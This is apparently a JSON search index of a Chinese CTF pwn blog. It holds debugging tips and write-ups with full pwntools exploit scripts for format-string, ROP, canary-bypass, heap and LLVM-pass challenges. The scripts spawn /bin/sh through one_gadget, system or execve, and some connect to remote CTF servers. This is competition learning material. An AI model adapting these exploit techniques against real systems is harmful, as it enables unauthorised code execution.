[{"categories":null,"content":"chuwei's friends","date":"2025-05-26","objectID":"/friends/","tags":null,"title":"Index","uri":"/friends/"},{"categories":null,"content":"\r友情链接\r```yaml - nickname: \u003cyour nickname\u003e avatar: \u003cyour avatar\u003e url: \u003cyour site link\u003e description: \u003cdescription of your site\u003e ``` ","date":"2025-05-26","objectID":"/friends/:0:0","tags":null,"title":"Index","uri":"/friends/"},{"categories":["pwn"],"content":"本文主要用于记录pwn题目的一些tips gdb.attach(p,‘b *0x40094c’) b *$rebase(0x相对基址偏移)0x 相对基址偏移就是 IDA 显示的三位数 strings libc.so.6|grep ubuntu strings libc.so.6|grep libc 查看libc 版本信息 strings elf | grep GCC 查看libc 信息 但是不一定对，当编译环境和运行环境不一样时 开启和关闭缓存区有什么区别 开启的化printf 遇到\\n才输出， 不开启 就直接输出 %*6$c %7$n相当于%addr c %7$n *6为格式化字符串第六个参数中的值 %p%10$n 前面已经输出的字符 是%p那里的值，比如0x7f60847b55a0 finish 命令和 return 命令的区别是，finish 命令会执行函数到正常退出；而 return 命令是立即结束执行当前函数并返回，也就是说，如果当前函数还有剩余的代码未执行完毕，也不会执行了。除此之外，return 命令还有一个功能，即可以指定该函数的返回值。 为了结束while的read循环while ( read(0, nptr, 0x10uLL) \u003e 0 )可以用p.shutdown('send')命令，不过不能再发送第二次了 IDA 修复jmp rax https://bbs.pediy.com/thread-268245.htm https://blog.csdn.net/huzai9527/article/details/121204850 https://www.jianshu.com/p/cc0bc578b951 IO_flush_all_lockp函数触发条件： 当libc执行abort流程时 abort可以通过触发malloc_printerr来触发 当执行exit函数时 当执行流从main函数返回时 一个gadget,暂时不知道有什么用，先记录一下 pwndbg\u003e x/20i svcudp_reply+26 0x7f5cdf09931a \u003csvcudp_reply+26\u003e: mov rbp,QWORD PTR [rdi+0x48] 0x7f5cdf09931e \u003csvcudp_reply+30\u003e: mov rax,QWORD PTR [rbp+0x18] 0x7f5cdf099322 \u003csvcudp_reply+34\u003e: lea r13,[rbp+0x10] 0x7f5cdf099326 \u003csvcudp_reply+38\u003e: mov DWORD PTR [rbp+0x10],0x0 0x7f5cdf09932d \u003csvcudp_reply+45\u003e: mov rdi,r13 0x7f5cdf099330 \u003csvcudp_reply+48\u003e: call QWORD PTR [rax+0x28] 一个将泄露出16进制的flag字符串转换的小脚本 a='flag{afffd8-e4-25-c73ec9b075-18008fbf}' for i in range(13): t=a[4*i:4*i+4] #32位泄露出的是4字节，64位是8字节 print(t[::-1],end='') 将泄露出的小端序数据转换为字符串 byte_str=ru('\\n')[:-1].decode().replace(\"0xa\",'').replace('0x','') print(\"byte_str==\",byte_str) bytes_data = bytes.fromhex(byte_str) bytes_data=bytes_data.decode() string=\"\" for i in range(0, len(bytes_data), 4): string=string+''.join(reversed(bytes_data[i:i+4])) print(string) patchelf 报错修复：https://zikh26.github.io/posts/8cbdee5a.html#patch-libc%E5%92%8Cld%E8%BF%87%E7%A8%8B set context-output /dev/pts/2 方便调试 在flag文件名未知的情况下无法构造常规orw来读取 这时候可以利用getdents64函数，它读取目录文件中的一个个目录项并返回 参考：ls命令是怎样实现的，getdents64，linux-2.6.27.5 https://github.com/Naetw/CTF-pwn-tips 一些小tips libc.search(asm('pop rdi;ret;')).__next__() 搜索libc中的gadgets rop=ROP(libc) pop_rax = libc_base + rop.find_gadget(['pop rax', 'ret'])[0] 查看fs段寄存器：p/x $fs_base 某些情况下patchelf 需要将 libc.so.6 设置为绝对路径 patchelf --replace-needed /lib/x86_64-linux-gnu/libc.so.6 ./libc-2.32.so ./elf strcpy 会将结束符\\x00copy到目标字符串，strlen遇到'\\x00'截止 qemu 调试异架构 def killport(port): '''root authority is required''' command=\"kill -9 $(netstat -nlp | grep :\"+str(port)+\" | awk '{print $7}' | awk -F'/' '{{ print $1 }}')\" os.system(command) def mydbg(): attach_payload =\"\"\" gdb-multiarch\\ -ex \"file {0}\"\\ -ex \"targe remote :{1}\"\\ -ex \"setarchitecture {2}\"\\ \"\"\".format('./1',port,\"arm\") # -ex \"add-symbol-file {libc_file_path} {addr}\" pwnlib.util.misc.run_in_new_terminal(attach_payload) 异构静态编译的情况下可以通过arena_get_retry和dl_runtime_reslove来控制参数 aarch64 riscv64: is_trusted_path_normalize 函数这里可以控制sp进行栈迁移 dil 是rdi寄存器的低32位 https://www.jianshu.com/p/57128e477efb 在libc段存在elf 地址，比如stdout 设置返回地址位libc_start_main_impl+139 程序会重新从main函数开始 set context-sections 命令用于配置在打印当前堆栈帧时显示的上下文信息部分。它定义了在上下文输出中显示哪些信息。 该命令接受一个字符串参数，用于指定要包含在上下文显示中的部分。可用的部分包括： all：包括所有可用的部分。 registers：显示寄存器的值。 code：显示反汇编的代码。 stack：显示堆栈内存。 data：显示数据内存。 gs，fs寄存器可以让我们找到程序的地址 %*的利用 [19:41]You can leak value on the stack using %* [19:41]Although u cant specify the index [19:41]U can use %c %c %* to get a leak on any position _nptl_change_stack_perm 可用于设置栈的权限，目前在risc-v题的题目中见过 BuckeyeCTF Spaceman from pwn import * import struct context.binary = elf = ELF(\"./spaceman\") # io = process(\"./run.sh\") # io = remote(\"127.0.0.1\",1337) io = remote(\"challs.pwnoh.io\", 13372) sc = b\"A\"*0x2e sc = b\"\\x93\\x08\\xf0\\x03\\x13\\x05\\x00\\x00\\x93\\x05\\x81\\xec\\x13\\x06\\x00\\x10s\\x00\\x00\\x00\" # sc = b\"A\"*8 # sc += b\"B\"*8 # sc += b\"C\"*8 # sc += b\"D\"*8 io.sendlineafter(b'LOGIN: ',sc) environ = 0x8f6a0 _read = 0x2474e # arb write (write help function over echo 0x89028) address = 0x89008#0x8a990 p = b\"gang\\x00aaa\" p += b\"A\"*8#p64(0x89028) # p = p.ljust(0x10,b\"A\") p += p64(address) # p += b\"C\"*7 p += p64(_read)[:-1] io.sendlineafter(b\"COMMAND\u003e \",p) # sle","date":"2025-01-04","objectID":"/posts/pwn%E6%9D%82%E8%AE%B0/:0:0","tags":["杂记"],"title":"PWN杂记","uri":"/posts/pwn%E6%9D%82%E8%AE%B0/"},{"categories":[null],"content":"简介\rchuwei 目前IIE研一在读 baby pwner ","date":"2025-01-04","objectID":"/about/:0:0","tags":[null],"title":"About","uri":"/about/"},{"categories":["赛题复现"],"content":"强网杯\rez_fmt\r解法一\r程序开头给了stack 地址，利用格式化字符串漏洞修改返回地址，爆破one_gadget ，概率为1/4096。 from pwn import* context.arch='amd64' #context.log_level='debug' s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) def mydbg(): gdb.attach(p,\"b *0x401239\") pause() i=1 while True: p=remote('47.104.24.40',1337) #p=process(\"./ez_fmt\") ru(\"There is a gift for you \") stack_addr=int(ru(\"\\n\"),16) lg(\"stack_addr\") lg(\"i\") i=i+1 w_addr=0x0404010 ret_addr=stack_addr+0x68 main_addr=0x401196 lg(\"ret_addr\") payload=\"%19$p\" payload+=\"%\"+str(0x40-14)+\"c\"+\"%10$hhn\"+\"%\"+str(0xfb01-0x40)+\"c\"+\"%11$hn\" payload=payload.ljust(0x20,'a') payload=payload.encode()+p64(ret_addr+2)+p64(ret_addr) #mydbg() s(payload) # pause() libc_base=int(rn(14),16)-0x24083 lg(\"libc_base\") one_gaget=libc_base+0xe3b01 lg(\"one_gaget\") myogg=(libc_base\u00260xffffffffff000000)+0x40fb01 lg(\"myogg\") if myogg==one_gaget: pause() print(\"success\") else: p.close() continue p.interactive() 解法二\r利用格式化字符串漏洞篡改printf 函数的返回地址为start，同时泄露libc，这样就不会修改w为0，然后第二次格式化字符串漏洞修改返回地址为one gadget。 from pwn import* context.arch='amd64' context.log_level='debug' #p=remote(\"chals.sekai.team\",4001) #libc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) def mydbg(): gdb.attach(p,\"b *0x401239\") pause() p=process(\"./ez_fmt\") ru(\"There is a gift for you \") stack_addr=int(ru(\"\\n\"),16) lg(\"stack_addr\") w_addr=0x0404010 ret_addr=stack_addr-0x8 start_addr=0x4010B0 lg(\"ret_addr\") payload=\"%19$p\"+\"%\"+str((start_addr\u00260xfffff)-14)+\"c\"+\"%9$hn\" payload=payload.encode().ljust(0x18,b\"a\")+p64(ret_addr) sl(payload) libc_base=int(rn(14),16)-0x24083 lg(\"libc_base\") one_gadgt=0xe3b01+libc_base ru(\"There is a gift for you \") ret1_addr=stack_addr-0xe8 lg(\"one_gadgt\") payload=\"%\"+str(one_gadgt\u00260xff)+\"c\"+\"%10$hhn\"+\"%\"+str(((one_gadgt\u003e\u003e8)\u00260xffff)-(one_gadgt\u00260xff))+\"c%11$hn\" payload=payload.encode().ljust(0x20,b\"a\")+p64(ret1_addr)+p64(ret1_addr+1) s(payload) p.interactive() warmup23\rglibc 2.35 下的off by null，和glibc 2.31下的off by null 利用手法相同。 参考链接：http://tttang.com/archive/1614/#toc__6 构造出堆块重叠后进行largebin attack，修改stderr为fake file。然后利用off by null 修改top chunk size，申请一个大的chunk，触发malloc_assert ，利用house of apple 执行orw。 from pwn import* context.arch='amd64' context.log_level='debug' p=remote(\"120.24.69.11\",12700) #p=process('./warmup') libc=ELF('./libc.so.6') s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) def mydbg(): gdb.attach(p,\"dir ~/glibc/glibc-2.35/\") pause() def m","date":"2023-12-29","objectID":"/posts/2023-12%E6%9C%88%E6%AF%94%E8%B5%9Bwp%E5%A4%8D%E7%8E%B0/:0:0","tags":["赛题复现"],"title":"2023 12月比赛wp复现","uri":"/posts/2023-12%E6%9C%88%E6%AF%94%E8%B5%9Bwp%E5%A4%8D%E7%8E%B0/"},{"categories":["pwn"],"content":"该文用于收录一些比赛时不会的栈题目，仅记录一些做题思路。 geek challenge 2023\rez_fullprotection\r首先在game 中输入 字符 跳过scanf 输入，这样后面printf 就会泄露程序基址，后面创建的子进程函数中存在栈溢出，输入一长串字符串即可劫持TLS绕过canary。 from pwn import* context.arch='amd64' context.log_level='debug' #p=remote(\"pwn.node.game.sycsec.com\",31009) p=process('./ez_fullprotection') libc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) def mydbg(): gdb.attach(p,\"b *$rebase(0x101a)\") pause() ru(\"Tell me your name: \") sl(\"aaaa\") #mydbg() ru(\"Enter your guess : \") s(\"a\") ru(\"but you entered \") elf_base=int(rn(14),10)-0x001240 pop_rdi=elf_base+0x00000000000016e3 pop_rsi=elf_base+0x00000000000016e1 pop_addr=elf_base+0x16DA mov_addr=elf_base+0x16C0 puts_plt=0x001150+elf_base puts_got=elf_base+0x3F60 gets_plt=elf_base+0x11C0 bss=elf_base+0x04e08 pop_rsp=elf_base+0x00000000000016dd ret=elf_base+0x000000000000101a ru(\"Don't lose heart\") s(\"\\n\") lg(\"elf_base\") ru(\"This should work.\\n\") ru(\"\u003e \") payload=b'a'*0x38+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(bss)+p64(gets_plt)+p64(pop_rsp)+p64(bss-0x18) payload=payload.ljust(0xa00,b\"a\") sl(payload) libc_base=uu64()-libc.sym['puts'] lg(\"libc_base\") pop_rdx=libc_base+0x0000000000142c92 sys=libc_base+libc.sym['execve'] binsh=bss+0x40 payload=p64(pop_rdi)+p64(binsh)+p64(pop_rsi)+p64(0)*2+p64(pop_rdx)+p64(0)+p64(sys)+b\"/bin/sh\\x00\" sl(payload) p.interactive() elevator\rv1[0] 未初始化，因此我们可以通过alloca抬高栈，让v1[0]恰好指向残留的canary，然后输入字符，即可绕过scanf的读入，接下来printf 进行泄露。 from pwn import* context.arch='amd64' context.log_level='debug' #p=remote(\"pwn.node.game.sycsec.com\",31707) s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) def mydbg(): gdb.attach(p) pause() while True: p=process('./elevator') libc=ELF(\"./libc.so.6\") ru(\"Tell me your name so i can let you in:\") sl(\"a\"*0x58) ru(\"Please enter the floor you want to reach:\") #mydbg() sl(\"23\") ru(\"How long do you think you have to wait?\") sl(\"-\") msg=ru(\"!\") if b'bad' in msg: p.close() continue float_num=ru(\"s\")[:-1] if b'-0.000000' in float_num or b'0.000000' in float_num: p.close() continue break canary=struct.pack(\"\u003cd\", eval(float_num)) canary=u64(canary) lg(\"canary\") ru(\"I believe you can easily solve this problem.\") pop_rdi=0x00000000004016f3 puts_plt=0x4010D0 puts_got=0x404020 read_addr=0x401521 bss=0x404a08 payload=b'a'*0x28+p64(canary)+p64(bss)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(read_addr) #mydbg() sl(payload) libc_base=uu64()-libc.sym['puts'] sys=libc_base+libc.sym['system'] binsh=libc_base+next(libc.search(b\"/bin/sh\")) payload=b'a'*0x28+p64(canary)+p64(bss)+p64(pop_rdi)+p64(binsh)+p64(sys) sl(payload) p.interactive() Square ctf2023\rsuper-sick-tank-game\r程序模拟了一个tank 游戏，通过srand 生成一个靶子位置，你可以通过角度和力量操纵子弹的落地位置，这样我们就可以通过靶子的位置，然后选择适当的角度和力量去击中该靶子，并覆写该位置为子弹的值，当连续击中靶子3次之后，我们可以获得特殊弹药-，该弹药可在目标的±1 位置均覆写为子弹的值。因此我们可以用来覆写max_power 和max_angel。这样我们就可以前向覆盖一些变量的值（因为cos90-cos180 为负数），如覆盖miss_ctr ，增加我们miss的次数。 接下来覆写num_ammo_types ，也就是下图中的2，这里是ida反编译错误，实际应该为变量num_","date":"2023-11-30","objectID":"/posts/stack-challenge/:0:0","tags":["stack"],"title":"Stack Challenge","uri":"/posts/stack-challenge/"},{"categories":["pwn"],"content":"本文主要记录一下llvm pass pwn的学习过程。 前言\r首先我们要了解一下llvm pass和llvm IR。 可参考以下内容： https://llvm.org/docs/WritingAnLLVMPass.html （官方的hello world pass介绍） https://zhuanlan.zhihu.com/p/392381317 （上手官方文档 Hello Pass） https://evian-zhang.github.io/llvm-ir-tutorial/index.html （llvm IR入门指南，介绍IR的基础语法） 阅读完以上内容后，对llvm pass和IR有了一定的认识，接下来就可以进行做题了。 准备工作\r通过题目给出的opt版本下载对应的llvm和clang sudo apt install llvm-version sudo apt install clang-version 使用opt同版本的clang 生成ll或bc文件 ，如题目给出的为opt-8，则使用以下命令 clang-8 -emit-llvm -S exp.c -o exp.ll 此外题目还会给出一个llvm pass模块，我们需要使用IDA打开该****.so文件，对其进行分析发现漏洞点。 然后使用./opt-version -load ./****.so -PASS_name ./exp.{ll/bc}（PASS_name 可见readme文档或逆向分析）命令加载模块并启动LLVM的优化分析。 题目中常见的llvm语法可阅读winmt师傅的文章： 也可参考官方文档https://releases.llvm.org/2.0/docs/ProgrammersManual.html、https://llvm.org/doxygen/classllvm_1_1User.html（问gpt也很方便） 调试命令如下： gdb ./opt b main set args -load ./xxxx.so -xxxx ./exp.ll #设置参数 opt并不会一开始就将so模块加载进来，而是在call了一堆llvm初始化相关函数后才会加载so模块 如下所示，LLVMHello.so加载成功 然后使用LLVMHello.so的基地址加上对应so模块中的汇编指令偏移就即可下断点。 红帽杯-2021 simpleVM\r题目链接：https://github.com/Hornos3/pwnfile/tree/master/LLVM/challenges/RedHat2021-simpleVM IDA 打开.so 文件，alt+T 搜索vtable 重写的runOnFunction函数是sub_6830 函数分析\r可以得出pass名为VMPass，接下来分析sub_6830函数 首先判断函数名称是否为o0o0o0o0，若是，则进入sub_6AC0函数 sub_6AC0函数会遍历函数内部所有的basicblock，并将basicblock传递到sub_6B80函数 在sub_6B80函数中，程序会遍历basicblock中的每条指令，然后匹配指令名，根据结果以及指令参数情况来决定做什么操作。 查看本机的/usr/include/llvm-8/llvm/IR/Instruction.def，发现llvm-8中，call对应的操作符号为55 push和pop分析 程序定义了几个变量来模拟栈：reg1（off_20DFD0 中存储的是reg1的地址），reg2（off_20DFC0 中存储的是reg2的地址），stack（off_20DFD8 存储的是 stack 的地址），然后模拟出pop、push的操作：pop就是将栈中的值给寄存器，然后stack-8，push就是将寄存器中的值赋给栈，然后stack+8 store 和load函数 add和min函数使得寄存器加或减去一个值 漏洞利用\r通过上面对函数的分析，函数的漏洞利用就很明显了 利用add函数使得reg2的值为free_got 利用load 指令读取 free_got中的值赋给reg1 利用add函数 使reg1的值加上one_gadget 距离 free 的偏移得到one_gadget 利用store 函数，将free_got 修改为one_gadget 退出获取shell exp\r测试环境为Ubuntu 18.04，对应GLIBC 2.27-3ubuntu1.6版本，exp如下 //free_got 077E100 //one_gadget-free=0x729ec void o0o0o0o0(); void pop(int reg_index); void push(int reg_index); void store(int reg_index); void load(int reg_index); void add(int reg_index,int value); void min(int reg_index,int value); void o0o0o0o0(){ add(2,0x077E100); load(2); add(1,0x729ec); store(2); } CISCN-2021 satool\r可以得出pass名为SAPass，重写的runOnFunction函数为sub_19D0 函数分析\r反编译后的函数比较杂乱，和之前相比很难看懂，这里我们只关注函数的关键操作。 首先函数会判断这函数的名字是否为B4ckDo0r，如果不是，则会直接退出。要想进行下面的处理，我们就必须要让一个函数的名字为B4ckDo0r。 通过调试，可以知道if ( !(unsigned int)std::string::compare(\u0026v89, \"save\") )这类语句都是判断是否在B4ckDo0r中调用了某个函数（如save()），并对其进行一系列操作。此外，如-1431655765 * (unsigned int)((unsigned __int64)((char *)\u0026v15[3 * v18 + -3 * NumTotalBundleOperands] - v20) \u003e\u003e 3) == 2这类语句的左侧就是取调用的这个函数的参数个数。 save函数的关键操作如下： v25是save的一参，v30是save的二参，malloc 分配一个chunk，并将v25和v30通过memcpy赋给chunk的data。 takeaway的关键操作如下 释放chunkptr指向的chunk，并使chunk ptr指向chunk ptr[2]中指向的chunk。 stealkey的关键操作如下： 使byte_204100的值等于 chunk_ptr 指向chunk 的data值（即chunk fd位置存储的值） fakekey的关键操作如下： 使byte_204100等于byte_204100 加上fakekey的参数，然后并将byte_204100的值赋给chunk_ptr 指向chunk 的data（即chunk fd位置存储的值） run的关键操作如下： 将chunk ptr指向chunk中的值作为函数指针直接执行。 这里引用一下blackbird师傅的总结分析，得出各个函数的重要功能如下 漏洞利用\r在我们执行到sub_19D0函数时，程序中含有许多bins， 我们利用save在清空tcache后即可申请到unsorted bin，此时我们设置save的第一个参数为空，即可保留该chunk的fd为main_arena+96，如此便可得到libc地址。 利用stealkey将main_arena+96存储在byte_204100 利用fakekey使byte_204100加上其距离one_gadget 的偏移，使chunk的fd为one_gadget 利用run执行one_gadget 获取shell exp\r测试环境为Ubuntu 18.04，对应GLIBC 2.27-3ubuntu1.6版本，exp如下 //main_arena-onegadget=-0x39c9ae void save(char *a,char *b){} void takeaway(){} void stealkey(){} void fakekey(int a){} void run(){} void B4ckDo0r(){ save(\"\",\"\");//0 save(\"\",\"\");//1 save(\"\",\"\");//2 save(\"\",\"\");//3 save(\"\",\"\");//4 save(\"\",\"\");//5 save(\"\",\"\");//6 save(\"\",\"\");//7 stealkey(); fakekey(-0x39c9ae); run(); } CISCN-2022 satool\r前言：本题主要参考了winmt 师傅的博客，也可以说是复制了。 pass名为mba，题目没有去除符号表，重写的runOnFunction函数为``anonymous namespace’::MBAPass::runOnFunction` 可以看到，首先代码设置this[4] 为可读可写，经过handle函数的处理，设置其为可读可执行，然后执行this[4]处的代码，接下来就对handle函数进行分析 handle函数中倒序对基本块中的指令进行处理的，第一个是if判断指令的第一个操作数是否是常量，第二个if判断指令判断第一个操作数是否为函数的参数，如果都不是，则","date":"2023-07-14","objectID":"/posts/llvm-pass-pwn-%E5%AD%A6%E4%B9%A0/:0:0","tags":["llvm"],"title":"LLVM_PASS_PWN_学习","uri":"/posts/llvm-pass-pwn-%E5%AD%A6%E4%B9%A0/"}]